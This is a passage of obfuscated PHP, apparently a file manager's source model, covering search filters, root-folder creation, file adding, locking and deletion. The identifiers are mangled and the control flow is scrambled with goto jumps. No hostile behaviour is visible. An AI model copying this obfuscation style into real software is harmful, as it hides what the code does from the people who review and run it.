$this->field($C‘ÙäŸÔ[1917])->where($BŒêÎ•¯¤­)->select(); $fìŒê¨Ùâ‘ = array_to_keyvalue(array_filter_by_field($B¹†¼‘İØ, $C‘ÙäŸÔ[397], $C‘ÙäŸÔ[86]), $C‘ÙäŸÔ[33], $C‘ÙäŸÔ[390]); $cÓÌÔøÌŞİ = array_merge($cÓÌÔøÌŞİ, array_to_keyvalue($B¹†¼‘İØ, $C‘ÙäŸÔ[33], $C‘ÙäŸÔ[390])); goto D¦˜´¡°·¬; eØÓ£ƒ Û…: } private function _listSearchBindPinyin($dÜêœÑº˜Ó, &$D‚‹‹ÜíËÓ, &$E¦‡¶·‹‰©) { goto aÇê»İ¦…ƒ; c•£ë¿Óõ†: $DÚ©ùìÔ¥Ï = "\x4c\105\106\124\x20\x4a\x4f\111\116\x20{$this->tablePrefix}\151\157\137\x73\157\165\162\x63\x65\137\155\145\164\x61\x20\155\x65\x74\141\x20\157\x6e\x20\163\x6f\x75\x72\x63\145\56\x73\x6f\165\162\143\x65\111\104\x20\x3d\40\x6d\145\x74\x61\x2e\163\x6f\165\x72\143\145\111\104"; $cÉ°öóÆ¬« = array(); $E¦‡¶·‹‰© = str_replace(array($B¢é«ìÄÕ[227], $B¢é«ìÄÕ[50], $B¢é«ìÄÕ[1918]), $B¢é«ìÄÕ[33], $E¦‡¶·‹‰©); goto aùÏÃ®Ş; aùÏÃ®Ş: $E¦‡¶·‹‰© = $B¢é«ìÄÕ[1919] . str_replace($B¢é«ìÄÕ[47], $B¢é«ìÄÕ[1920], $E¦‡¶·‹‰©); $b®¬İ·¦íÆ = $D‚‹‹ÜíËÓ[$B¢é«ìÄÕ[28]]; unset($D‚‹‹ÜíËÓ[$B¢é«ìÄÕ[28]]); goto b‘ƒ…î× À; aÇê»İ¦…ƒ: $B¢é«ìÄÕ =& $_SERVER[µ…]; if (!isset($dÜêœÑº˜Ó[$B¢é«ìÄÕ[1753]]) || !$dÜêœÑº˜Ó[$B¢é«ìÄÕ[1753]]) { return; } if (!Input::check($dÜêœÑº˜Ó[$B¢é«ìÄÕ[1753]], $B¢é«ìÄÕ[314]) || strlen($dÜêœÑº˜Ó[$B¢é«ìÄÕ[1753]]) < 2) { return; } goto c•£ë¿Óõ†; eë•ÁŸâ¹‡: $D‚‹‹ÜíËÓ = $cÉ°öóÆ¬«; goto eÕğó×¯Õ©; b‘ƒ…î× À: foreach ($D‚‹‹ÜíËÓ as $AÍÚÙœš => $e…Üõ®ô¹) { $cÉ°öóÆ¬«[$B¢é«ìÄÕ[1919] . $AÍÚÙœš] = $e…Üõ®ô¹; } foreach ($b®¬İ·¦íÆ as $FÛ˜ÊöÕ¾) { $cÉ°öóÆ¬«[] = array($B¢é«ìÄÕ[1921] => $FÛ˜ÊöÕ¾, $B¢é«ìÄÕ[935] => $B¢é«ìÄÕ[1757], array($B¢é«ìÄÕ[1922] => $FÛ˜ÊöÕ¾, $B¢é«ìÄÕ[1923] => array($B¢é«ìÄÕ[7], array($B¢é«ìÄÕ[438], $B¢é«ìÄÕ[437])))); } $this->join($DÚ©ùìÔ¥Ï); goto eë•ÁŸâ¹‡; eÕğó×¯Õ©: } private function _parseSearchWhere($AÊ÷º»­Œ¸) { goto dÆçŒ…„Â£; c„·¸Šùä: if (isset($AÊ÷º»­Œ¸[$C¤Ì­î£[557]]) && $AÊ÷º»­Œ¸[$C¤Ì­î£[557]]) { $BëâµÌªœë[] = array($C¤Ì­î£[428] => $AÊ÷º»­Œ¸[$C¤Ì­î£[557]], $C¤Ì­î£[426] => $AÊ÷º»­Œ¸[$C¤Ì­î£[557]], $C¤Ì­î£[935] => $C¤Ì­î£[1757]); } if (isset($AÊ÷º»­Œ¸[$C¤Ì­î£[399]]) && $AÊ÷º»­Œ¸[$C¤Ì­î£[399]]) { $FÖ°£Œ¸Ñ£ = $AÊ÷º»­Œ¸[$C¤Ì­î£[399]]; if ($FÖ°£Œ¸Ñ£ == $C¤Ì­î£[76]) { $BëâµÌªœë[$C¤Ì­î£[397]] = 1; } else { if ($FÖ°£Œ¸Ñ£ == $C¤Ì­î£[1927]) { $BëâµÌªœë[$C¤Ì­î£[397]] = 0; } else { if ($FÖ°£Œ¸Ñ£) { $FÖ°£Œ¸Ñ£ = is_array($FÖ°£Œ¸Ñ£) ? $FÖ°£Œ¸Ñ£ : explode($C¤Ì­î£[47], $FÖ°£Œ¸Ñ£); $BëâµÌªœë[$C¤Ì­î£[399]] = array($C¤Ì­î£[405], $FÖ°£Œ¸Ñ£); $BëâµÌªœë[$C¤Ì­î£[397]] = 0; } } } } if (isset($AÊ÷º»­Œ¸[$C¤Ì­î£[472]]) && $AÊ÷º»­Œ¸[$C¤Ì­î£[472]]) { $a¸³¸˜Â¹ù = $this->sourceInfo($AÊ÷º»­Œ¸[$C¤Ì­î£[472]]); $BëâµÌªœë[$C¤Ì­î£[548]] = array($C¤Ì­î£[507], $a¸³¸˜Â¹ù[$C¤Ì­î£[481]] . $AÊ÷º»­Œ¸[$C¤Ì­î£[472]] . $C¤Ì­î£[508]); } goto CºµŒ‘ºá£; CºµŒ‘ºá£: if (isset($AÊ÷º»­Œ¸[$C¤Ì­î£[1753]]) && trim($AÊ÷º»­Œ¸[$C¤Ì­î£[1753]])) { $e”Ã…À÷Ó… = trim($AÊ÷º»­Œ¸[$C¤Ì­î£[1753]]); $DÏ‹¹ĞŞî¤ = explode($C¤Ì­î£[50], $e”Ã…À÷Ó…); if (strlen($e”Ã…À÷Ó…) > 2 && (substr($e”Ã…À÷Ó…, 0, 1) == $C¤Ì­î£[115] && substr($e”Ã…À÷Ó…, -1) == $C¤Ì­î£[115]) || substr($e”Ã…À÷Ó…, 0, 1) == $C¤Ì­î£[55] && substr($e”Ã…À÷Ó…, -1) == $C¤Ì­î£[55]) { $e”Ã…À÷Ó… = substr($e”Ã…À÷Ó…, 1, -1); $DÏ‹¹ĞŞî¤ = array($e”Ã…À÷Ó…); } $BëâµÌªœë[$C¤Ì­î£[28]] = array(array($C¤Ì­î£[507], $C¤Ì­î£[1755] . $e”Ã…À÷Ó… . $C¤Ì­î£[1755])); if (count($DÏ‹¹ĞŞî¤) > 1) { $BëâµÌªœë[$C¤Ì­î£[28]] = array(); foreach ($DÏ‹¹ĞŞî¤ as $aÊØ¤“®ôÒ) { if (!trim($aÊØ¤“®ôÒ)) { continue; } $BëâµÌªœë[$C¤Ì­î£[28]][] = array($C¤Ì­î£[507], $C¤Ì­î£[1755] . trim($aÊØ¤“®ôÒ) . $C¤Ì­î£[1755]); } } } return $BëâµÌªœë; goto a„Ëºğ¶ğ; c±„‚ùŠ¼Æ: if (isset($AÊ÷º»­Œ¸[$C¤Ì­î£[470]]) && $AÊ÷º»­Œ¸[$C¤Ì­î£[470]]) { $d´Ú×†í¬ = array($C¤Ì­î£[1925], $AÊ÷º»­Œ¸[$C¤Ì­î£[470]]); if ($BëâµÌªœë[$C¤Ì­î£[83]]) { $BëâµÌªœë[$C¤Ì­î£[83]] = array($BëâµÌªœë[$C¤Ì­î£[83]], $d´Ú×†í¬, $C¤Ì­î£[1926]); } else { $BëâµÌªœë[$C¤Ì­î£[83]] = $d´Ú×†í¬; } } if (isset($AÊ÷º»­Œ¸[$C¤Ì­î£[1915]]) && $AÊ÷º»­Œ¸[$C¤Ì­î£[1915]] > 0) { $BëâµÌªœë[$C¤Ì­î£[77]] = array($C¤Ì­î£[1924], $AÊ÷º»­Œ¸[$C¤Ì­î£[1915]]); } if (isset($AÊ÷º»­Œ¸[$C¤Ì­î£[1916]]) && $AÊ÷º»­Œ¸[$C¤Ì­î£[1916]]) { $d´Ú×†í¬ = array($C¤Ì­î£[1925], $AÊ÷º»­Œ¸[$C¤Ì­î£[1916]]); if ($BëâµÌªœë[$C¤Ì­î£[77]]) { $BëâµÌªœë[$C¤Ì­î£[77]] = array($BëâµÌªœë[$C¤Ì­î£[77]], $d´Ú×†í¬, $C¤Ì­î£[1926]); } else { $BëâµÌªœë[$C¤Ì­î£[77]] = $d´Ú×†í¬; } } goto c„·¸Šùä; dÆçŒ…„Â£: $C¤Ì­î£ =& $_SERVER[µ…]; $BëâµÌªœë = array(); if (isset($AÊ÷º»­Œ¸[$C¤Ì­î£[717]]) && $AÊ÷º»­Œ¸[$C¤Ì­î£[717]]) { $BëâµÌªœë[$C¤Ì­î£[83]] = array($C¤Ì­î£[1924], $AÊ÷º»­Œ¸[$C¤Ì­î£[717]]); } goto c±„‚ùŠ¼Æ; a„Ëºğ¶ğ: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($FÙ•ç§¾ï) { $C†Ó„¡Ê¾ä =& $_SERVER[µ…]; $aÔ˜äø¨Î = Model($C†Ó„¡Ê¾ä[497])->where(array($C†Ó„¡Ê¾ä[1498] => $FÙ•ç§¾ï))->find(); $bÍÇ–ÊÀŞ÷ = $this->_mkdirRoot(SourceModel::TYPE_USER, $FÙ•ç§¾ï, $aÔ˜äø¨Î[$C†Ó„¡Ê¾ä[28]]); $this->userDesktopAdd($bÍÇ–ÊÀŞ÷); return $bÍÇ–ÊÀŞ÷; } public function userDesktopAdd($DŠ’‘Õßçã) { $AôÄ²õ…Ñ =& $_SERVER[µ…]; $A£ğ‡á‹ä­ = LNG($AôÄ²õ…Ñ[1928]); $c•™£©Ûøì = $this->mkdir($DŠ’‘Õßçã, $A£ğ‡á‹ä­); $this->metaSet($c•™£©Ûøì, $AôÄ²õ…Ñ[1929], $AôÄ²õ…Ñ[86]); $this->metaSet($DŠ’‘Õßçã, $AôÄ²õ…Ñ[1930], $c•™£©Ûøì); } public function groupRootAdd($b¢ç‡ÈˆÎˆ) { $fè²Äº´ãÕ =& $_SERVER[µ…]; $B“šÜ„À = Model($fè²Äº´ãÕ[480])->where(array($fè²Äº´ãÕ[1748] => $b¢ç‡ÈˆÎˆ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $b¢ç‡ÈˆÎˆ, $B“šÜ„À[$fè²Äº´ãÕ[28]]); } public function systemRootPathAdd($Fˆ—¸¬) { if ($Fˆ—¸¬ != $_SERVER[µ…][500]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $Fˆ—¸¬); } public function userRootRemove($e®»‰ÜŞµº) { $dŞéâõÆó‘ = $this->sourceRoot(SourceModel::TYPE_USER, $e®»‰ÜŞµº); if (!$dŞéâõÆó‘) { return; } $this->remove($dŞéâõÆó‘, !1); } public function groupRootRemove($AØÂØ¦¿—) { $Bï·Ôğá—¨ = $this->sourceRoot(SourceModel::TYPE_GROUP, $AØÂØ¦¿—); if (!$Bï·Ôğá—¨) { return; } $this->remove($Bï·Ôğá—¨, !1); } private function _mkdirRoot($cóêù î—†, $BîŞ‰È‘, $Eí»âîÃ®) { goto CÙÎç¢Èƒİ; CÙÎç¢Èƒİ: $Aˆà åæ›ƒ =& $_SERVER[µ…]; $aø£º…âñ = array($Aˆà åæ›ƒ[389] => 0, $Aˆà åæ›ƒ[544] => $cóêù î—†, $Aˆà åæ›ƒ[545] => $BîŞ‰È‘, $Aˆà åæ›ƒ[541] => 1, $Aˆà åæ›ƒ[546] => USER_ID, $Aˆà åæ›ƒ[547] => USER_ID, $Aˆà åæ›ƒ[542] => $Aˆà åæ›ƒ[33], $Aˆà åæ›ƒ[548] => $Aˆà åæ›ƒ[493], $Aˆà åæ›ƒ[416] => 0, $Aˆà åæ›ƒ[543] => 0, $Aˆà åæ›ƒ[442] => 0, $Aˆà åæ›ƒ[549] => $Aˆà åæ›ƒ[33]); if ($eæÏ‰ÙÊ = $this->where($aø£º…âñ)->find()) { return $eæÏ‰ÙÊ[$Aˆà åæ›ƒ[390]]; } goto D˜İƒÔâß°; D˜İƒÔâß°: $EÃÃÜ¿ë²‹ = "\115\157\x64\145\x6c\123\157\x75\162\x63\145\x2e\x6d\x6b\x64\151\162\x52\x6f\x6f\x74\x2e{$cóêù î—†}\56{$BîŞ‰È‘}\x2e" . $Eí»âîÃ®; CacheLock::lock($EÃÃÜ¿ë²‹); $aø£º…âñ[$Aˆà åæ›ƒ[28]] = $Eí»âîÃ®; goto eÎ›ñ”¯…ø; eÎ›ñ”¯…ø: $EáŠ¬×í® = $this->add($aø£º…âñ); $Ağ¾Ğ‹ = array($Aˆà åæ›ƒ[550] => short_id($EáŠ¬×í®)); $this->where(array($Aˆà åæ›ƒ[404] => $EáŠ¬×í®))->save($Ağ¾Ğ‹); goto eˆÏª£Ú«„; eˆÏª£Ú«„: CacheLock::unlock($EÃÃÜ¿ë²‹); return $EáŠ¬×í®; goto a¸ÇÏ„ô¤Ü; a¸ÇÏ„ô¤Ü: } private function sourceRoot($dÚİÂÎÏËª, $b‡ù˜ìÑ, $cïŒ­§øåÈ = false) { $bº™Û—ù” =& $_SERVER[µ…]; $dÖ°˜É = array($bº™Û—ù”[389] => 0, $bº™Û—ù”[544] => $dÚİÂÎÏËª, $bº™Û—ù”[545] => $b‡ù˜ìÑ); if ($cô øÊŸé… = $this->where($dÖ°˜É)->find()) { return $cïŒ­§øåÈ ? $cô øÊŸé… : $cô øÊŸé…[$bº™Û—ù”[390]]; } return !1; } public function sourceRootGroup($c¾—áóìÏ§) { goto dµÜ¤÷ó; dµÜ¤÷ó: $dÍ…ÀÌÅ‡ =& $_SERVER[µ…]; if (is_string($c¾—áóìÏ§)) { $c¾—áóìÏ§ = array($c¾—áóìÏ§); } $Dğñ˜©Ã = array($dÍ…ÀÌÅ‡[389] => 0, $dÍ…ÀÌÅ‡[544] => SourceModel::TYPE_GROUP, $dÍ…ÀÌÅ‡[545] => array($dÍ…ÀÌÅ‡[7], $c¾—áóìÏ§)); goto F¨Ç«àíõ×; F¨Ç«àíõ×: $this->selectPageReset(); $aßƒ‰”ƒ = $this->listSource($Dğñ˜©Ã, 1000); $this->selectPageRestore(); goto C †â„ÉÃä; C †â„ÉÃä: return array_to_keyvalue($aßƒ‰”ƒ[$dÍ…ÀÌÅ‡[74]], $dÍ…ÀÌÅ‡[478]); goto e°¤Ï˜Í†à; e°¤Ï˜Í†à: } public function mkfile($B­ˆóíêÁÇ, $dÙŒì¦¹è, $CöÒ´ÙºÆ = '', $fœÀÂ¸ÈŸ = REPEAT_RENAME) { $C­…Ãì”É =& $_SERVER[µ…]; $e¯¿Ì”Ï´ = Model($C­…Ãì”É[566])->addFileByContent($CöÒ´ÙºÆ, $dÙŒì¦¹è); return $this->_createFileCall($B­ˆóíêÁÇ, $dÙŒì¦¹è, $e¯¿Ì”Ï´, $fœÀÂ¸ÈŸ, $C­…Ãì”É[1192]); } public function addFile($CÉ•¢—‘ , $dãÑ§„¹„, $aÌ™¬±ˆİ, $eáÖÜ¡ˆô = false, $C­©†ºô÷¥ = REPEAT_RENAME) { $eíìá¦ÊÅÓ = Model($_SERVER[µ…][566])->addFile($dãÑ§„¹„, $aÌ™¬±ˆİ, $eáÖÜ¡ˆô); return $this->_createFileCall($CÉ•¢—‘ , $aÌ™¬±ˆİ, $eíìá¦ÊÅÓ, $C­©†ºô÷¥); } public function addFileByFileID($BÒÀ±Ì†Ñ, $f³µ³ÇÉ‡‚, $aîìñºƒùŒ, $e¢‰Ø›öÂÕ = REPEAT_RENAME) { $CÓ†‡ÄÉ•‚ =& $_SERVER[µ…]; $AóËÌÆÕ„á = Model($CÓ†‡ÄÉ•‚[566])->find($f³µ³ÇÉ‡‚); Model($CÓ†‡ÄÉ•‚[566])->linkAdd($f³µ³ÇÉ‡‚); return $this->_createFileCall($BÒÀ±Ì†Ñ, $aîìñºƒùŒ, $AóËÌÆÕ„á, $e¢‰Ø›öÂÕ); } public function addFileByRemote($cÃ‰œ£ è®, $Eø„—ôôãÚ, $AÎÂË¥•¸‚, $Eá±åš¬ = array(), $BĞÎĞÑ¸µñ = REPEAT_RENAME) { $FñÂ‡ÖÅ¾ = Model($_SERVER[µ…][566])->addFileByRemote($Eø„—ôôãÚ, $AÎÂË¥•¸‚, $Eá±åš¬); return $this->_createFileCall($cÃ‰œ£ è®, $AÎÂË¥•¸‚, $FñÂ‡ÖÅ¾, $BĞÎĞÑ¸µñ); } private function _createFileCall($CóÂÄµ¯ß, $fÎ÷Äˆ¾Õ¡, $fªâÉøÖñ, $B¼¾ºäÄ—, $B¦„õ”«ÜÃ = "\x75\x70\154\157\141\144") { goto Eº½‡½–Ã·; Eº½‡½–Ã·: $dÄ¿é˜¸ =& $_SERVER[µ…]; $c…×®¶Šê = !1; $this->lockWriteStart($CóÂÄµ¯ß, $fÎ÷Äˆ¾Õ¡); goto eê†›á‘æî; eê†›á‘æî: $c×¥…–Ò™ = $this->fileNameExist($CóÂÄµ¯ß, $fÎ÷Äˆ¾Õ¡); $A”îæ´ë³ö = $this->_createFile($CóÂÄµ¯ß, $fÎ÷Äˆ¾Õ¡, $fªâÉøÖñ, $B¼¾ºäÄ—, $c…×®¶Šê); if (!$c…×®¶Šê) { Model($dÄ¿é˜¸[444])->remove($fªâÉøÖñ[$dÄ¿é˜¸[441]]); } goto c¿ÇÌƒÜ¹; c¿ÇÌƒÜ¹: if ($c…×®¶Šê && $A”îæ´ë³ö && $A”îæ´ë³ö != $c×¥…–Ò™) { Model($dÄ¿é˜¸[1900])->eventCreate($A”îæ´ë³ö, $B¦„õ”«ÜÃ); } $this->lockWriteEnd($CóÂÄµ¯ß, $fÎ÷Äˆ¾Õ¡); return $A”îæ´ë³ö; goto eåïçÔñ; eåïçÔñ: } public function mkdir($D³ğíˆ±ø¾, $d­µ¢Ğ‡¬Ü, $Aß¥˜Ã–¦„ = REPEAT_SKIP) { goto e¥¶¦³´‚¡; e¥¶¦³´‚¡: $fŸÃàÃ¯‹ƒ =& $_SERVER[µ…]; $Fòê¡…… = $this->sourceInfo($D³ğíˆ±ø¾); if (!$Fòê¡……) { return !1; } goto FÛ®ÛËêÍí; FÛ®ÛËêÍí: $this->lockWriteStart($D³ğíˆ±ø¾, $d­µ¢Ğ‡¬Ü); if ($Aß¥˜Ã–¦„ !== !1) { $e¾¡º‰™¼ = $this->fileNameExist($D³ğíˆ±ø¾, $d­µ¢Ğ‡¬Ü); if ($e¾¡º‰™¼ && $Aß¥˜Ã–¦„ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($D³ğíˆ±ø¾, $d­µ¢Ğ‡¬Ü); return $e¾¡º‰™¼; } $d­µ¢Ğ‡¬Ü = $this->fileNameAuto($D³ğíˆ±ø¾, $d­µ¢Ğ‡¬Ü, $Aß¥˜Ã–¦„); } $döò²œã—³ = array($fŸÃàÃ¯‹ƒ[541] => 1, $fŸÃàÃ¯‹ƒ[407] => $d­µ¢Ğ‡¬Ü, $fŸÃàÃ¯‹ƒ[542] => $fŸÃàÃ¯‹ƒ[33], $fŸÃàÃ¯‹ƒ[442] => 0, $fŸÃàÃ¯‹ƒ[543] => 0); goto bÚò–ï‰Ü; bÚò–ï‰Ü: $AéèÜåùã = $this->_addSoure($döò²œã—³, $Fòê¡……); Model($fŸÃàÃ¯‹ƒ[1900])->eventCreate($AéèÜåùã, $fŸÃàÃ¯‹ƒ[1193]); $this->lockWriteEnd($D³ğíˆ±ø¾, $d­µ¢Ğ‡¬Ü); goto Fàäİ“¬¬ñ; Fàäİ“¬¬ñ: return $AéèÜåùã; goto dÉ£‘ÊÛÍ¶; dÉ£‘ÊÛÍ¶: } private function _createFile($F›ÌÛÅ‚Àæ, $eÑ‰¡„ïÂ, $Cö‘¸Õö×, $C¿ÀÌÇë“É, &$c¾¾ØùÛÇø) { goto eŞç¤ñÛ÷˜; AÖ‘á²™È¡: return $C©«¢ÚŠ›; goto C·”‡¾ëá³; Fˆæ¯»ğìŒ: if ($C¿ÀÌÇë“É !== !1) { $a’½Ïî­œî = $this->fileNameExist($F›ÌÛÅ‚Àæ, $eÑ‰¡„ïÂ); } $c¾¾ØùÛÇø = !0; if ($C¿ÀÌÇë“É && $a’½Ïî­œî) { if ($C¿ÀÌÇë“É == REPEAT_SKIP) { $c¾¾ØùÛÇø = !1; return $a’½Ïî­œî; } else { if ($C¿ÀÌÇë“É == REPEAT_REPLACE) { $AÌ¢ŸãÅ·İ = $this->sourceInfo($a’½Ïî­œî); $BÁø•õ“Äµ = $this->fileHistory($AÌ¢ŸãÅ·İ, $Cö‘¸Õö×[$AïŒèÀƒ†[441]], $Cö‘¸Õö×[$AïŒèÀƒ†[77]]); if (!$BÁø•õ“Äµ) { $c¾¾ØùÛÇø = !1; } else { $this->folderSizeReset($F›ÌÛÅ‚Àæ); } return $a’½Ïî­œî; } else { $eÑ‰¡„ïÂ = $this->fileNameAuto($F›ÌÛÅ‚Àæ, $eÑ‰¡„ïÂ, $C¿ÀÌÇë“É, !1); } } } goto c‚•ò­Å; eŞç¤ñÛ÷˜: $AïŒèÀƒ† =& $_SERVER[µ…]; $Cì¯Ü““òÉ = $this->sourceInfo($F›ÌÛÅ‚Àæ); if (!$Cö‘¸Õö× || !$Cì¯Ü““òÉ) { return !1; } goto Fˆæ¯»ğìŒ; c‚•ò­Å: $aÌ…Ğ°ßÁ­ = array($AïŒèÀƒ†[541] => 0, $AïŒèÀƒ†[407] => $eÑ‰¡„ïÂ, $AïŒèÀƒ†[542] => get_path_ext($eÑ‰¡„ïÂ), $AïŒèÀƒ†[442] => $Cö‘¸Õö×[$AïŒèÀƒ†[441]], $AïŒèÀƒ†[543] => $Cö‘¸Õö×[$AïŒèÀƒ†[77]]); $C©«¢ÚŠ› = $this->_addSoure($aÌ…Ğ°ßÁ­, $Cì¯Ü““òÉ); $this->folderSizeReset($F›ÌÛÅ‚Àæ, intval($aÌ…Ğ°ßÁ­[$AïŒèÀƒ†[77]])); goto AÖ‘á²™È¡; C·”‡¾ëá³: } protected function fileHistory($f¤ãøÃÛã, $A‰áå³ºî, $EÉ…âêÃÃƒ) { goto e’­ÃõÙ¸; b´µîó®È: Model($aÍ³˜˜¨‚ò[1931])->addHistory($f¤ãøÃÛã); $fÊ¬í„èäª = array($aÍ³˜˜¨‚ò[547] => USER_ID, $aÍ³˜˜¨‚ò[411] => time(), $aÍ³˜˜¨‚ò[441] => $A‰áå³ºî, $aÍ³˜˜¨‚ò[77] => $EÉ…âêÃÃƒ); $this->where(array($aÍ³˜˜¨‚ò[404] => $f¤ãøÃÛã[$aÍ³˜˜¨‚ò[390]]))->save($fÊ¬í„èäª); goto FäñŠ‘Ş© ; FäñŠ‘Ş© : $this->sourceCacheClear($f¤ãøÃÛã[$aÍ³˜˜¨‚ò[390]]); return !0; goto CÈ²Š†“; e’­ÃõÙ¸: $aÍ³˜˜¨‚ò =& $_SERVER[µ…]; if ($f¤ãøÃÛã[$aÍ³˜˜¨‚ò[441]] == $A‰áå³ºî) { return !1; } $this->checkLock($f¤ãøÃÛã[$aÍ³˜˜¨‚ò[390]], $A‰áå³ºî); goto b´µîó®È; CÈ²Š†“: } public function checkLock($fšœñ»âÄÎ, $e¢ë¥ù²¤„) { goto B­¶óÁÁŸÖ; B­¶óÁÁŸÖ: $F’áÈÜ— =& $_SERVER[µ…]; $d¯ßˆ¸È…Ñ = $this->pathInfo($fšœñ»âÄÎ); if (!$this->fileIsLock($d¯ßˆ¸È…Ñ, !0)) { return; } goto c½™Õõ¶©; c½™Õõ¶©: $f¦­¯‚Âõ† = Session::get($F’áÈÜ—[1932]); $A»‰¼†‚¸ = substr($d¯ßˆ¸È…Ñ[$F’áÈÜ—[28]], 0, -1 - strlen($d¯ßˆ¸È…Ñ[$F’áÈÜ—[167]])) . $F’áÈÜ—[1458] . $f¦­¯‚Âõ† . $F’áÈÜ—[94] . $d¯ßˆ¸È…Ñ[$F’áÈÜ—[167]]; $Bç«ã¯˜ì = Model($F’áÈÜ—[566])->find($e¢ë¥ù²¤„); goto E£ ÓÛò¸Ë; E£ ÓÛò¸Ë: $this->_createFileCall($d¯ßˆ¸È…Ñ[$F’áÈÜ—[472]], $A»‰¼†‚¸, $Bç«ã¯˜ì, REPEAT_REPLACE, $F’áÈÜ—[1192]); $A‘“æ¬ó…‹ = $d¯ßˆ¸È…Ñ[$F’áÈÜ—[439]][$F’áÈÜ—[505]]; $b¹Å²­Ñª = $A‘“æ¬ó…‹[$F’áÈÜ—[1933]] ? $A‘“æ¬ó…‹[$F’áÈÜ—[1933]] : $A‘“æ¬ó…‹[$F’áÈÜ—[28]]; goto E‘§ê“Íğï; E‘§ê“Íğï: show_json(LNG($F’áÈÜ—[1934]) . $F’áÈÜ—[1935] . LNG($F’áÈÜ—[1936]) . $F’áÈÜ—[1937] . $b¹Å²­Ñª . $F’áÈÜ—[1938], !1); goto DµöÃ²‹ŒÔ; DµöÃ²‹ŒÔ: } public function fileIsLock($cÅ¦ĞËÌæñ, $DğèÒÙó–ø = false) { goto cöÌÂ“‚œ÷; cöÌÂ“‚œ÷: $B¥¿ÊµÆİ =& $_SERVER[µ…]; if (!isset($cÅ¦ĞËÌæñ[$B¥¿ÊµÆİ[439]]) || !$cÅ¦ĞËÌæñ[$B¥¿ÊµÆİ[439]][$B¥¿ÊµÆİ[502]]) { return !1; } if ($cÅ¦ĞËÌæñ[$B¥¿ÊµÆİ[439]][$B¥¿ÊµÆİ[502]] != USER_ID) { return !0; } goto fô‹ŞÌœ›¢; d‰Ï‘Í‰ˆã: return !1; goto AØ„«ÀÅ‘ø; fô‹ŞÌœ›¢: $a¾ãŠÓÚ¯Œ = $GLOBALS[$B¥¿ÊµÆİ[6]][$B¥¿ÊµÆİ[87]][$B¥¿ÊµÆİ[503]]; if ($cÅ¦ĞËÌæñ[$B¥¿ÊµÆİ[439]][$B¥¿ÊµÆİ[504]] <= time() - $a¾ãŠÓÚ¯Œ) { $this->metaSet($cÅ¦ĞËÌæñ[$B¥¿ÊµÆİ[390]], $B¥¿ÊµÆİ[502], null); $this->metaSet($cÅ¦ĞËÌæñ[$B¥¿ÊµÆİ[390]], $B¥¿ÊµÆİ[504], null); } if ($DğèÒÙó–ø) { $this->metaSet($cÅ¦ĞËÌæñ[$B¥¿ÊµÆİ[390]], $B¥¿ÊµÆİ[504], time()); } goto d‰Ï‘Í‰ˆã; AØ„«ÀÅ‘ø: } private function _addSoure($BÒˆ‘Û¶†ç, $cÃí¹‹é¶Ë) { goto c×” ™—õ«; c×” ™—õ«: $b‚¥˜Ï‘ï =& $_SERVER[µ…]; $d¸Ù¹ì–„¥ = array($b‚¥˜Ï‘ï[544] => $cÃí¹‹é¶Ë[$b‚¥˜Ï‘ï[398]], $b‚¥˜Ï‘ï[545] => $cÃí¹‹é¶Ë[$b‚¥˜Ï‘ï[478]], $b‚¥˜Ï‘ï[546] => USER_ID, $b‚¥˜Ï‘ï[547] => USER_ID, $b‚¥˜Ï‘ï[389] => $cÃí¹‹é¶Ë[$b‚¥˜Ï‘ï[390]], $b‚¥˜Ï‘ï[548] => $cÃí¹‹é¶Ë[$b‚¥˜Ï‘ï[481]] . $cÃí¹‹é¶Ë[$b‚¥˜Ï‘ï[390]] . $b‚¥˜Ï‘ï[47], $b‚¥˜Ï‘ï[416] => 0, $b‚¥˜Ï‘ï[549] => $b‚¥˜Ï‘ï[33]); $BÒˆ‘Û¶†ç = array_merge($d¸Ù¹ì–„¥, $BÒˆ‘Û¶†ç); goto b¯›…ŸÚåÓ; b¯›…ŸÚåÓ: $this->updateModifyTime($BÒˆ‘Û¶†ç[$b‚¥˜Ï‘ï[472]]); $fÑŠËàÈ®† = $b‚¥˜Ï‘ï[1939] . $cÃí¹‹é¶Ë[$b‚¥˜Ï‘ï[390]]; if (isset(self::$cacheChildList[$fÑŠËàÈ®†])) { unset(self::$cacheChildList[$fÑŠËàÈ®†]); } goto e§½›®ÀÎ; BÛ¿„Ó£õ: return $d±ö±ÃãÃ¼; goto B¸ÜÜ‹¼¢; e§½›®ÀÎ: static $c¸¢­Ùã¯¡ = false; if (!$c¸¢­Ùã¯¡) { Hook::trigger($b‚¥˜Ï‘ï[531], $BÒˆ‘Û¶†ç); $c¸¢­Ùã¯¡ = !0; } $d±ö±ÃãÃ¼ = $this->add($BÒˆ‘Û¶†ç); goto c¨˜çšĞ‹Ë; c¨˜çšĞ‹Ë: $FËÉ¢‹«„Î = array($b‚¥˜Ï‘ï[550] => short_id($d±ö±ÃãÃ¼)); $this->where(array($b‚¥˜Ï‘ï[404] => $d±ö±ÃãÃ¼))->save($FËÉ¢‹«„Î); $this->setNamePinyin($d±ö±ÃãÃ¼, $BÒˆ‘Û¶†ç[$b‚¥˜Ï‘ï[28]]); goto BÛ¿„Ó£õ; B¸ÜÜ‹¼¢: } public function remove($fÓ¦Ø×¤˜÷, $AïÕÊ¬Ü˜¯ = true) { goto AŠã×º¯®‘; e¢„ÜøÃ¹ó: $Eµˆ¯¼¥åô = Model($E‚¶£ˆÜÙÛ[1505])->get($E‚¶£ˆÜÙÛ[1940]) == $E‚¶£ˆÜÙÛ[86]; if ($b½Ç¶›¯Æˆ || $AïÕÊ¬Ü˜¯ || !$Eµˆ¯¼¥åô) { return $this->removeNow($fÓ¦Ø×¤˜÷, $AïÕÊ¬Ü˜¯); } $b¬ÍØÏòæ¨ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto dÍŸ…ä°¥; AŠã×º¯®‘: $E‚¶£ˆÜÙÛ =& $_SERVER[µ…]; $aè…®É¯óƒ = $this->sourceInfo($fÓ¦Ø×¤˜÷); $b½Ç¶›¯Æˆ = intval($aè…®É¯óƒ[$E‚¶£ˆÜÙÛ[398]]) === self::TYPE_SYSTEM; goto e¢„ÜøÃ¹ó; FÄ»±¬†¶Ê: $this->recycleClear($aè…®É¯óƒ); $A¿¾¡Ôêº = $this->move($fÓ¦Ø×¤˜÷, $E„Ö‚·§¿º, REPEAT_RENAME_FOLDER); 